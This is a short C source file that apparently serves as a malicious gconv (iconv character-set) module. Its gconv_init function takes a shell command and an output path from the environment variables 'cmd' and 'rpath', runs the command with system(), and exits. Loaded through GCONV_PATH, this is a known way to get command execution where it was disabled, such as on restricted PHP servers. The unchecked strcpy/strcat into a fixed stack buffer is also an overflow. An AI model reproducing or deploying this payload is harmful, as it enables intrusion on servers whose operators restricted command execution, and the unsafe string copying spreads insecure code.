#include <stdlib.h>
#include <string.h>

void gconv() {}

void gconv_init() {
  char str[65536];
  if (getenv("cmd") != NULL && getenv("rpath") != NULL){
        strcpy(str,getenv("cmd"));
        strcat(str," > ");
        strcat(str, getenv("rpath"));
        system(str);
  }
  exit(0);
}